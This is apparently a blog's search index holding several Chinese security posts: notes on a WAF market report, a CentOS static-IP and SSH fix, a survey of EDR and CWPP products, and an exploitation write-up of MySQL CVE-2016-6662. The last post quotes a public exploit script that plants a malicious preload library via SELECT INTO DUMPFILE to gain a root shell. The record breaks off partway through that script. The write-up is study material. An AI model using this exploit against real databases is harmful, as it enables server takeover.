<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>阅读笔记-FreeBuf企业安全系列之2020国内WAF产品研究报告</title>
    <url>/zh-CN/freebuf-waf-2020-report.html</url>
    <content><![CDATA[<p>准备好好了解产品的本人，</p>
<p>看到最近新出《FreeBuf企业安全系列之2020国内WAF产品研究报告》。</p>
<p>当然是要仔细阅读，总结归纳一下。</p>
<h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><ul>
<li><p>部署WAF的必要性</p>
<ul>
<li>开发时遗留问题：应用程序本身有问题；</li>
<li>Web中间件漏洞：使用了存在漏洞的组件；</li>
<li>运维管理中的问题：错误配置、重要文件泄露等；</li>
<li>破坏手段多样：攻击手段多样化；</li>
</ul>
</li>
<li><p>业务场景及功能</p>
<ul>
<li>精准访问控制：机密性和完整性保护</li>
<li>Web漏洞攻击防护：就算程序有漏洞，也不会攻击成功。</li>
<li>CC攻击防护：DDoS的一类，最像正常请求，不一定是正常用户发起的。</li>
<li>0day漏洞缓解：在未修复漏洞的情况下，下发虚拟补丁进行防护</li>
</ul>
</li>
<li><p>WAF通常具备的功能</p>
<ul>
<li>HTTP、HTTPS协议的解析和过滤，如协议不同版本的识别和解析、协议参数长度限制等</li>
<li>各类Web攻击防护，如SQL注入、XSS跨站、CSRF、网页后门等；</li>
<li>各种自动化攻击防护，如暴力破解、撞库、批量注册、自动发帖的等；</li>
<li>阻止其它常见威胁，如：爬虫、0day攻击、代码分析、嗅探、数据篡改、越权访问、敏感信息泄露、应用层DDoS、远程恶意包含、盗链、越权、扫描等</li>
<li>其他管理与审计，如安全配置、日志分析、报表与统计功能等。</li>
</ul>
</li>
<li><p>WAF的分类</p>
<ul>
<li>硬件型<ul>
<li>优点：以多种方式（如透明桥接模式、旁路模式、反向代理等）、性能好、功能全面、支持多种模式部署等</li>
<li>缺点：价格比较贵</li>
<li>常见厂商：绿盟、安恒、启明星辰</li>
</ul>
</li>
<li>软件型：纯软件实现；<ul>
<li>优点：安装简单、容易使用、成本低</li>
<li>缺点：性能限制、可能存在兼容性、安全等问题</li>
<li>常见产品：ModSecurity、Naxsi、安全狗等</li>
</ul>
</li>
<li>云WAF<ul>
<li>代表厂商：阿里云、腾讯云、深信服云WAF、Imperva WAF</li>
</ul>
</li>
</ul>
</li>
<li><p>WAF部署：用户请求先经过WAF，再到达网站。</p>
<ul>
<li>部署模式<ul>
<li>反向代理：用户访问时，直接访问到WAF，如果是恶意请求、攻击，访问会被直接拦截，正常的访问WAF才会向服务器转发请求。</li>
<li>透明代理：通常只有硬件WAF才会部署为透明代理。透明代理模式下，访问会直接指向真实服务器，但流量到达服务器之前，会隐性被WAF过滤，只有正常的访问才会被放行到服务器。</li>
<li>旁路：没有防护能力，没有监听能力。</li>
</ul>
</li>
<li>使用与调试<ul>
<li>传统WAF：维护大量设置、调整规则。</li>
<li>云WAF：将云WAF绑定到虚拟主机，然后通过控制台设置页面，开启WAF开关。</li>
</ul>
</li>
</ul>
</li>
<li><p>企业不满意WAF的地方</p>
<ul>
<li>防御检出有效度</li>
<li>影响业务性能</li>
<li>WAF规则维护成本高</li>
<li>云WAF数据隐私保护问题</li>
<li>费用昂贵</li>
</ul>
</li>
<li><p>企业希望WAF增强的能力</p>
<ul>
<li>业务安全防护能力</li>
<li>情报能力</li>
<li>上下文理解能力</li>
<li>AI能力</li>
<li>协同能力</li>
<li>语义分析能力</li>
<li>审计举证能力</li>
</ul>
</li>
<li><p>WAF产品应该包含哪些新功能</p>
<ul>
<li>集成和共享威胁情报库</li>
<li>针对企业定向攻击事件的分析</li>
<li>通过扫描器验证验证Web攻击数据的有效性</li>
<li>页面混淆，动态防御</li>
<li>容器部署方式</li>
<li>集成或联动RASP分析</li>
<li>流量审计</li>
</ul>
</li>
<li><p>新兴市场的挑战</p>
<ul>
<li>对非OWASP TOP 10攻击防护响应较慢：传统厂商通病，因为不熟悉业务，对于攻击场景缺乏全面的认识。</li>
<li>实体WAF转向获取服务：企业的开源节流，降低成本。</li>
<li>提供额外的解决方案，比如应用层DDoS防护、bot缓解，甚至CDN等非安全功能，这类叫WAAP：WAF之前只是解决一些单点的问题，现在开始从保障Web应用程序整体可用性、保密性、完整性来设计产品功能，是一个很好的进步。就像杀毒软件演变成现在的电脑管家类似。</li>
<li>厂商着力于更为复杂的分析能力、自动化的调整机制。</li>
</ul>
</li>
<li><p>国内主流WAF产品名录</p>
<ul>
<li>硬件类：29</li>
<li>软件类：13</li>
<li>云WAF：57</li>
</ul>
</li>
<li><p>商业产品的比较（另外写一篇详细的）</p>
</li>
<li><p>开源方案：可以用来研究具体技术细节</p>
<ul>
<li><p>ModSecurity：支持Apache、IIS和Nginx</p>
<ul>
<li>功能：<ul>
<li>Cross Site Scripting (XSS)：阻止跨站脚本攻击</li>
<li>Local File Inclusion (LFI)：阻止利用本地文件包含漏洞进行攻击</li>
<li>Remote File Inclusione(RFI)：阻止利用远程文件包含漏洞进行攻击</li>
<li>Remote Code Execution (RCE)：阻止利用远程命令执行漏洞进行攻击</li>
<li>PHP Code Injectiod：阻止PHP代码注入</li>
<li>HTTP Protocol Violations：阻止违反HTTP协议的恶意访问</li>
<li>HTTPoxy：阻止利用远程代理感染漏洞进行攻击</li>
<li>Sshllshock：阻止利用Shellshock漏洞进行攻击</li>
<li>Session Fixation：阻止利用Session会话ID不变的漏洞进行攻击</li>
<li>Scanner Detection：阻止黑客扫描网站</li>
<li>Metadata/Error Leakages：阻止源代码/错误信息泄露</li>
<li>Project Honey Pot Blacklist：蜜罐项目黑名单</li>
<li>GeoIP Country Blocking：根据判断IP地址归属地来进行IP阻断</li>
</ul>
</li>
<li>优势：完美兼容nginx，支持OWASP规则，免费</li>
<li>劣势：不支持检查响应体的规则，OWASP中相关规则是95X；不支持OWASP核心规则集DDoS规则REQUEST-912-DOS- PROTECTION.conf，nginx本身支持配置DDoS限制；不支持在审计日志中包含请求和响应主体。</li>
</ul>
</li>
<li><p>ShareWAF</p>
<ul>
<li><p>功能</p>
<ul>
<li>传统WAF功能：防SQL中注入、防扫描等</li>
<li>浏览器端WAF、JS代码保护、动态变形元素、3D态势感</li>
</ul>
<p>知、传输加密、大数据防护等。</p>
<ul>
<li>部分开源：浏览器端WAF、负载均衡功能、守护进程功能、反爬虫功能。</li>
</ul>
</li>
<li><p>优势：创新、开源</p>
</li>
<li><p>劣势：稳定性、兼容性</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>下一代WAF类的产品，应该要从保障Web应用程序整体可用性、保密性、完整性来设计产品功能。</p>
<ul>
<li>基于Web应用程序本身的漏洞，最好还是从代码层面解决，WAF只是多加一个保险。同时也可以利用WAF捕获到的攻击，来测试Web应用程序的安全性。</li>
<li>而类似正常请求的攻击，WAF需要起到较大的防护作用。</li>
<li>WAF添加大量新功能的同时尽可能减少对Web应用系统正常访问的影响。</li>
<li>产品的安装、使用、运维必须要简单明了，客户才能好好使用。（P.S：如果对客户要求较高的技术水平，那我觉得这个产品有可能是来搞事情的<del>~</del></li>
<li>区别正常请求和异常请求，要从多维度来分析，包括源、请求数据、请求频率等。</li>
</ul>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>只不过是设置静态IP，SSH却连不上了？</title>
    <url>/zh-CN/centos-set-static-ip.html</url>
    <content><![CDATA[<p>由于我的CentOS虚拟机是通过DHCP动态获得IP地址，时不时就变一下。</p>
<p>导致保存好的SSH配置老是要随着更改。</p>
<p>我终于忍不住，决定配置静态IP。</p>
<p>配置好IP，SSH居然连不上了？？？</p>
<p>开头先感谢下列参考文章的作者，帮助我解决问题<del>~</del></p>
<blockquote>
<p><a href="https://www.cnblogs.com/yhongji/p/9336247.html" target="_blank" rel="noopener">centos7配置IP地址</a></p>
<p><a href="https://www.jianshu.com/p/0bdd3116736f" target="_blank" rel="noopener">CentOS 修改静态IP，SSH 连接异常的问题。</a></p>
<p><a href="[https://blog.csdn.net/weixin_42715413/article/details/84643885">解决ssh连接慢，挂起在SSH2_MSG_SERVICE_ACCEPT信息之后很久的问题</a></p>
</blockquote>
<h3 id="配置静态IP"><a href="#配置静态IP" class="headerlink" title="配置静态IP"></a>配置静态IP</h3><ol>
<li><p>查询网卡信息，确定要更改的网卡名称为<code>ens33</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:27:9e:d1 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.187.200/24 brd 192.168.187.255 scope global noprefixroute ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::d83c:c0cb:f482:e7c0/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:4a:82:31 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:4a:82:31 brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改网卡配置，把<code>BOOTPROTO=&quot;dhcp&quot;</code>改为<code>BOOTPROTO=&quot;static&quot;</code>，增加<code>IPADDR</code>、<code>NETMASK</code>、<code>GATEWAY</code>、<code>DNS</code>，保存文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# nano &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33</span><br><span class="line"></span><br><span class="line">修改前</span><br><span class="line">TYPE&#x3D;&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD&#x3D;&quot;none&quot;</span><br><span class="line">BROWSER_ONLY&#x3D;&quot;no&quot;</span><br><span class="line">BOOTPROTO&#x3D;&quot;dhcp&quot;</span><br><span class="line">DEFROUTE&#x3D;&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL&#x3D;&quot;no&quot;</span><br><span class="line">IPV6INIT&#x3D;&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF&#x3D;&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE&#x3D;&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL&#x3D;&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE&#x3D;&quot;stable-privacy&quot;</span><br><span class="line">NAME&#x3D;&quot;ens33&quot;</span><br><span class="line">UUID&#x3D;&quot;c3ba1376-66b3-4fa7-804d-528c7f4fea6e&quot;</span><br><span class="line">DEVICE&#x3D;&quot;ens33&quot;</span><br><span class="line">ONBOOT&#x3D;&quot;yes&quot;</span><br><span class="line"></span><br><span class="line">修改后</span><br><span class="line">YPE&#x3D;&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD&#x3D;&quot;none&quot;</span><br><span class="line">BROWSER_ONLY&#x3D;&quot;no&quot;</span><br><span class="line">BOOTPROTO&#x3D;&quot;static&quot;</span><br><span class="line">DEFROUTE&#x3D;&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL&#x3D;&quot;no&quot;</span><br><span class="line">IPV6INIT&#x3D;&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF&#x3D;&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE&#x3D;&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL&#x3D;&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE&#x3D;&quot;stable-privacy&quot;</span><br><span class="line">NAME&#x3D;&quot;ens33&quot;</span><br><span class="line">UUID&#x3D;&quot;c3ba1376-66b3-4fa7-804d-528c7f4fea6e&quot;</span><br><span class="line">DEVICE&#x3D;&quot;ens33&quot;</span><br><span class="line">ONBOOT&#x3D;&quot;yes&quot;</span><br><span class="line">IPADDR&#x3D;192.168.187.200</span><br><span class="line">NETMASK&#x3D;255.255.255.0</span><br><span class="line">GATEWAY&#x3D;192.168.187.1</span><br><span class="line">DNS1&#x3D;114.114.114.114</span><br><span class="line">DNS2&#x3D;8.8.8.8</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启网络 <code>systemctl restart network</code></p>
</li>
</ol>
<h3 id="SSH登录不上"><a href="#SSH登录不上" class="headerlink" title="SSH登录不上"></a>SSH登录不上</h3><p>用<code>Termius</code>连接服务器，能连接，却无法输入？？？</p>
<p>搜索了一下，是说SSH会进行DNS反向解析。</p>
<p>基于我刚刚的配置，是找不到的。于是就登录不上。</p>
<p>有两种解决方法</p>
<ol>
<li><p>将网卡配置里的<code>DNS</code>设置为网关，重启网络；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IPADDR&#x3D;192.168.187.200</span><br><span class="line">NETMASK&#x3D;255.255.255.0</span><br><span class="line">GATEWAY&#x3D;192.168.187.1</span><br><span class="line">DNS1&#x3D;192.168.187.1</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改sshd的配置文件<code>/etc/ssh/sshd_config</code>，将<code>UseDNS</code>设置为no；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UseDNS no</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>搞定啦，虽然只是一个小问题。同时又学到新东西啦。</p>
]]></content>
      <categories>
        <category>经验分享</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>主机安全、端点防护、HIDS、EDR、CWPP？</title>
    <url>/zh-CN/host-secruity.html</url>
    <content><![CDATA[<p><strong>为了加深对安全的了解，研究一下安全产品。</strong></p>
<p><strong>写的不完全、写的不一定对。</strong></p>
<p><strong>随着认识的增加，再持续更新~</strong></p>
<ul>
<li><p>主机都指哪些？</p>
<ul>
<li>办公终端：笔记本电脑、台式电脑、手机、平板电脑</li>
<li>服务器：物理服务器、云服务器、容器</li>
</ul>
</li>
<li><p>入侵检测主要思路</p>
<ul>
<li>确定的黑：黑特征匹配</li>
<li>确定的白：不符合正常行为，筛选出异常行为</li>
</ul>
</li>
<li><p>端点检测与响应 - EndpointDetection&amp;Response EDR</p>
<ul>
<li>主要针对办公终端，属于办公安全；</li>
<li>挑战<ul>
<li>兼容性：多种终端、多种操作系统（Windows、Mac、Linux、ios、安卓）</li>
<li>网络接入多样化，网络界线模糊，难以确认终端身份。</li>
<li>威胁检测的准确性；</li>
<li>资源耗用少；</li>
</ul>
</li>
<li>威胁场景<ul>
<li>接收带有恶意软件的邮件，并在运行恶意软件；</li>
<li>从网上下载了一些恶意office文档，并用漏洞版本的软件打开。</li>
<li>被其他受感染的终端传染。</li>
<li>安装破解版、带有后门的软件。</li>
</ul>
</li>
<li>主要解决的问题<ul>
<li>入侵检测：勒索病毒、木马</li>
<li>设备准入：系统环境检测合格才能接入网络，接入网络的时候，绑定设备与使用人的身份；</li>
<li>安全加固：操作系统加固、应用加固，修复漏洞；</li>
<li>日志记录：进程、网络、注册表等信息，掌握终端的实时情况；</li>
<li>网络访问控制：每台终端根据使用人的身份，设定允许访问的网络。</li>
</ul>
</li>
<li>商业化产品<ul>
<li><a href="https://edr.sangfor.com.cn/#/index/home" target="_blank" rel="noopener">深信服EDR</a></li>
<li><a href="https://ioa.tencent.com/" target="_blank" rel="noopener">腾讯iOA</a></li>
<li><a href="https://www.nsfocus.com.cn/html/2019/207_1230/89.html" target="_blank" rel="noopener">绿盟EDR</a></li>
</ul>
</li>
<li>开源软件<ul>
<li>OSSEC</li>
</ul>
</li>
</ul>
</li>
<li><p>云工作保护平台 - Cloud Workload Protection Platform CWPP</p>
<ul>
<li>主要针对：服务器包括云服务器、容器；属于运维安全；</li>
<li>挑战：<ul>
<li>兼容性：各式各样的Linux操作系统</li>
<li>稳定性：绝对不能影响生产系统</li>
<li>加固难：无法预料系统升级与加固带来的影响。</li>
<li>资源耗用要少；</li>
</ul>
</li>
<li>主要解决的问题<ul>
<li>入侵检测：弱密码、暴力破解、提权等</li>
<li>漏洞管理：漏洞检测与修复</li>
<li>网络访问控制</li>
<li>日志记录</li>
<li>资产清点</li>
<li>合规基线</li>
</ul>
</li>
<li>商业化产品<ul>
<li><a href="https://www.aliyun.com/product/aegis?spm=5176.224200.h2v3icoap.123.28c26ed6q5yfJa&aly_as=6xjjdde-" target="_blank" rel="noopener">阿里云安骑士</a></li>
<li><a href="https://qingteng.cn/index.html" target="_blank" rel="noopener">青藤云主机自适应安全平台</a></li>
<li><a href="https://cloud.tencent.com/product/cwp" target="_blank" rel="noopener">腾讯云主机安全</a></li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>主机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL CVE-2016-6662 漏洞利用与分析</title>
    <url>/zh-CN/cve-2016-6662.html</url>
    <content><![CDATA[<p>不想跟着参考文章模仿一遍，就选择其他操作系统搭建另外漏洞版本的MySQL。</p>
<p>结果，踩了些坑，弄了好几天。</p>
<p>终于！！！试出来了~</p>
<p>先感谢下列文章的作者~</p>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/84557" target="_blank" rel="noopener">【技术分享】CVE-2016-6662：Mysql远程代码执行/权限提升技术分析正式版（9/13 10:47更新） </a></p>
<p><a href="https://www.anquanke.com/post/id/84554" target="_blank" rel="noopener">【技术分享】CVE-2016-6662-MySQL ‘malloc_lib’变量重写命令执行分析 </a></p>
<p><a href="https://paper.seebug.org/46/" target="_blank" rel="noopener">MySQL远程代码执行／权限提升漏洞的分析与实践（CVE-2016-6662）</a></p>
<p><a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html" target="_blank" rel="noopener">MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662</a></p>
</blockquote>
<h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h2><ul>
<li>CVE：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6662" target="_blank" rel="noopener">CVE-2016-6662</a></li>
</ul>
<blockquote>
<p>Oracle MySQL through 5.5.52, 5.6.x through 5.6.33, and 5.7.x through  5.7.15; MariaDB before 5.5.51, 10.0.x before 10.0.27, and 10.1.x before  10.1.17; and Percona Server before 5.5.51-38.1, 5.6.x before  5.6.32-78.0, and 5.7.x before 5.7.14-7 allow local users to create arbitrary configurations and bypass certain protection mechanisms by  setting general_log_file to a my.cnf configuration. NOTE: this can be  leveraged to execute arbitrary code with root privileges by setting  malloc_lib. NOTE: the affected MySQL version information is from  Oracle’s October 2016 CPU. Oracle has not commented on third-party  claims that the issue was silently patched in MySQL 5.5.52, 5.6.33, and  5.7.15.</p>
</blockquote>
<ul>
<li><p>设置<code>general_log_file</code>，将<code>malloc_lib</code>参数值配置写入<code>my.cnf</code>，可以远程执行代码。</p>
</li>
<li><p>影响范围：5.5.x&lt;=5.5.51、5.6.x&lt;=5.6.32 、5.7.x&lt;=5.7.14 </p>
</li>
<li><p>总结：服务端的问题，涉及权限不当。</p>
</li>
</ul>
<a id="more"></a>



<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>MySQL 版本：5.6.32</p>
<p>操作系统：CentOS 7.6</p>
<ol>
<li><p>MySQL 5.6.32 默认安装</p>
<ul>
<li><p>安装运行 MySQL 5.6.32；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost mysql-5.6]# ls -l</span><br><span class="line">total 80104</span><br><span class="line">-rw-r--r--. 1 fen fen 20283448 Mar  2 23:07 MySQL-client-5.6.32-1.el7.x86_64.rpm</span><br><span class="line">-rw-r--r--. 1 fen fen 61738028 Mar  2 23:43 MySQL-server-5.6.32-1.el7.x86_64.rpm</span><br><span class="line">[root@localhost mysql-5.6]# yum install MySQL-*</span><br><span class="line">[root@localhost mysql-5.6]# service mysql start</span><br><span class="line">Starting MySQL. SUCCESS!</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看<code>mysql</code>相关进程，发现<code>mysqld_safe</code>进程，居然是<code>root</code>用户启动的；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ps aux | grep mysqld | grep -v grep</span><br><span class="line">root       3633  0.0  0.0  11692    52 ?        S    16:44   0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --pid-file=/var/lib/mysql/localhost.localdomain.pid</span><br><span class="line">mysql      3736  0.1  0.0 985344   448 ?        Sl   16:44   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --user=mysql --log-error=/var/lib/mysql/localhost.localdomain.err --pid-file=/var/lib/mysql/localhost.localdomain.pid</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看<code>mysqld_safe</code>的用法，发现支持<code>--malloc-lib=LIB</code> 参数，可加载共享库；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mysqld_safe --help</span><br><span class="line">Usage: /usr/bin/mysqld_safe [OPTIONS]</span><br><span class="line">  --no-defaults              Don't read the system defaults file</span><br><span class="line">  --defaults-file=FILE       Use the specified defaults file</span><br><span class="line">  --defaults-extra-file=FILE Also use defaults from the specified file</span><br><span class="line">  --ledir=DIRECTORY          Look for mysqld in the specified directory</span><br><span class="line">  --open-files-limit=LIMIT   Limit the number of open files</span><br><span class="line">  --core-file-size=LIMIT     Limit core files to the specified size</span><br><span class="line">  --timezone=TZ              Set the system timezone</span><br><span class="line">  --malloc-lib=LIB           Preload shared library LIB if available</span><br><span class="line">  --mysqld=FILE              Use the specified file as mysqld</span><br><span class="line">  --mysqld-version=VERSION   Use "mysqld-VERSION" as mysqld</span><br><span class="line">  --nice=NICE                Set the scheduling priority of mysqld</span><br><span class="line">  --plugin-dir=DIR           Plugins are under DIR or DIR/VERSION, if</span><br><span class="line">                             VERSION is given</span><br><span class="line">  --skip-kill-mysqld         Don't try to kill stray mysqld processes</span><br><span class="line">  --syslog                   Log messages to syslog with 'logger'</span><br><span class="line">  --skip-syslog              Log messages to error log (default)</span><br><span class="line">  --syslog-tag=TAG           Pass -t "mysqld-TAG" to 'logger'</span><br><span class="line"></span><br><span class="line">All other options are passed to the mysqld program.</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看<code>mysqld_safe</code>脚本里读取配置的部分；当前环境下，<code>$MY_BASEDIR_VERSION/my.cnf</code>与<code>$DATADIR/my.cnf</code>，只能读取一个；或者将<code>DATADIR</code>设为<code>$MY_BASEDIR_VERSION/data</code>，就会读取<code>$DATADIR/my.cnf</code>；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Try <span class="built_in">where</span> the binary installs put it</span></span><br><span class="line">if test -d $MY_BASEDIR_VERSION/data/mysql</span><br><span class="line">then</span><br><span class="line">  DATADIR=$MY_BASEDIR_VERSION/data</span><br><span class="line">  if test -z "$defaults" -a -r "$DATADIR/my.cnf"</span><br><span class="line">  then</span><br><span class="line">    defaults="--defaults-extra-file=$DATADIR/my.cnf"</span><br><span class="line">  fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> Next try <span class="built_in">where</span> the <span class="built_in">source</span> installs put it</span></span><br><span class="line">elif test -d $MY_BASEDIR_VERSION/var/mysql</span><br><span class="line">then</span><br><span class="line">  DATADIR=$MY_BASEDIR_VERSION/var</span><br><span class="line"><span class="meta">#</span><span class="bash"> Or just give up and use our compiled-in default</span></span><br><span class="line">else</span><br><span class="line">  DATADIR=/var/lib/mysql</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if test -z "$MYSQL_HOME"</span><br><span class="line">then </span><br><span class="line">  if test -r "$MY_BASEDIR_VERSION/my.cnf" &amp;&amp; test -r "$DATADIR/my.cnf"</span><br><span class="line">  then</span><br><span class="line">    log_error "WARNING: Found two instances of my.cnf -</span><br><span class="line"><span class="meta">$</span><span class="bash">MY_BASEDIR_VERSION/my.cnf and</span></span><br><span class="line"><span class="meta">$</span><span class="bash">DATADIR/my.cnf</span></span><br><span class="line">IGNORING $DATADIR/my.cnf"</span><br><span class="line"></span><br><span class="line">    MYSQL_HOME=$MY_BASEDIR_VERSION</span><br><span class="line">  elif test -r "$DATADIR/my.cnf"</span><br><span class="line">  then</span><br><span class="line">    log_error "WARNING: Found $DATADIR/my.cnf</span><br><span class="line">The data directory is a deprecated location for my.cnf, please move it to</span><br><span class="line"><span class="meta">$</span><span class="bash">MY_BASEDIR_VERSION/my.cnf<span class="string">"</span></span></span><br><span class="line">    MYSQL_HOME=$DATADIR</span><br><span class="line">  else</span><br><span class="line">    MYSQL_HOME=$MY_BASEDIR_VERSION</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line">export MYSQL_HOME</span><br></pre></td></tr></table></figure>
</li>
<li><p>搜索<code>my.cnf</code>配置文件，当前情况下，就算在<code>$DATADIR/my.cnf</code>写入配置，也是不生效的；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# find / -name my.cnf</span><br><span class="line">/usr/my.cnf</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置<code>general_log_file</code>，这个操作是需要<code>SUPER</code>权限；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global general_log_file=<span class="string">'/var/lib/mysql/my.log'</span>;</span></span><br><span class="line">ERROR 1227 (42000): Access denied; you need (at least one of) the SUPER privilege(s) for this operation</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>攻击脚本<code>0ldSQL_MySQL_RCE_exploit.py</code> </p>
<ul>
<li><p>共享库编译与写入指定目录，所以要求攻击者获得的数据库账号权限要有<code>FILE</code>；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># where will the library to be preloaded reside? /tmp might get emptied on reboot</span></span><br><span class="line"><span class="comment"># /var/lib/mysql is safer option (and mysql can definitely write in there ;)</span></span><br><span class="line">malloc_lib_path=<span class="string">'/var/lib/mysql/mysql_hookandroot_lib.so'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译 mysql_hookandroot_lib.so</span></span><br><span class="line"><span class="comment"># Compile mysql_hookandroot_lib.so shared library that will eventually hook to the mysqld </span></span><br><span class="line"><span class="comment"># process execution and run our code (Remote Root Shell)</span></span><br><span class="line"><span class="comment"># Remember to match the architecture of the target (not your machine!) otherwise the library</span></span><br><span class="line"><span class="comment"># will not load properly on the target.</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"Compiling mysql_hookandroot_lib.so"</span>)</span><br><span class="line">cmd = <span class="string">"gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl"</span></span><br><span class="line">process = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">(result, error) = process.communicate()</span><br><span class="line">rc = process.wait() </span><br><span class="line"><span class="keyword">if</span> rc != <span class="number">0</span>:</span><br><span class="line">    errmsg(<span class="string">"Failed to compile mysql_hookandroot_lib.so: %s"</span> % cmd)</span><br><span class="line">    <span class="keyword">print</span> error </span><br><span class="line">    shutdown(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 mysql_hookandroot_lib.so 文件</span></span><br><span class="line"><span class="comment"># Load mysql_hookandroot_lib.so library and encode it into HEX</span></span><br><span class="line">info(<span class="string">"Converting mysql_hookandroot_lib.so into HEX"</span>)</span><br><span class="line">hookandrootlib_path = <span class="string">'./mysql_hookandroot_lib.so'</span></span><br><span class="line"><span class="keyword">with</span> open(hookandrootlib_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出 mysql_hookandroot_lib.so 文件     </span></span><br><span class="line"><span class="comment"># Save library into a trigger file</span></span><br><span class="line">info(<span class="string">"Dumping shared library into %s file on the target"</span> % malloc_lib_path)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor = dbconn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">"""SELECT unhex("%s") INTO DUMPFILE '%s' """</span> % (hookandrootlib_hex, malloc_lib_path) )</span><br><span class="line"><span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">    errmsg(<span class="string">"Something went wrong: 